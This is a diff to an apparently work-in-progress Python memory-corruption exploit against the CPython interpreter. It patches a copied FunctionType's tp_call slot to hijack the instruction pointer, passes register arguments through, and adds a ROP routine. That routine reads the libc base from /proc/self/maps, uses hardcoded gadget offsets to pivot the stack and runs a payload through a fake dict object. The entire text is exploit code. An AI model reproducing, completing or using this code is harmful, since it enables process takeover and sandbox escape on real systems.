@@ -148,7 +148,7 @@ def getmem():
 	return mem
 
 
-def setrip(addr):
+def setrip(addr, rsi=tuple(), rdx=dict()):
 	# make a copy of the built-in function type object
 	ft_addr = addrof(FunctionType)
 	ft_len = sizeof(FunctionType)
@@ -157,9 +157,9 @@ def setrip(addr):
 	# patch tp_call
 	my_functype[16*8:16*8 + 8] = p64a(addr)
 	
-	# clear Py_TPFLAGS_HAVE_VECTORCALL in tp_flags
+	# clear Py_TPFLAGS_HAVE_VECTORCALL in tp_flags (perhaps not necessary?)
 	tp_flags = u64(my_functype[21*8:21*8 + 8])
-	tp_flags &= ~ (1<<11) # Py_TPFLAGS_HAVE_VECTORCALL
+	tp_flags &= ~(1<<11) # Py_TPFLAGS_HAVE_VECTORCALL
 	my_functype[21*8:21*8 + 8] = p64a(tp_flags)
 
 	# get a pointer to our patched function type
@@ -172,4 +172,14 @@ def setrip(addr):
 	my_func = fakeobj(my_func_ptr)
 
 	# call it!
-	return my_func()
+	return my_func(*rsi, **rdx)
+
+
+# XXX: work-in-progress
+def do_rop(payload):
+	libc_base = int([l for l in open("/proc/self/maps").read().split("\n") if "libc-" in l][0].split("-")[0], 16) # XXX: cheating!
+	mov_rsp_rdx_ret = libc_base + 0x52ab0 # XXX: hardcoded!
+	pop1ret = libc_base + 0x40780 # XXX hardcoded!
+
+	fakedict = fakeobj(refbytes(bytes(p64a(pop1ret-4, addrof(dict)) + payload)))
+	setrip(mov_rsp_rdx_ret, rdx=fakedict)
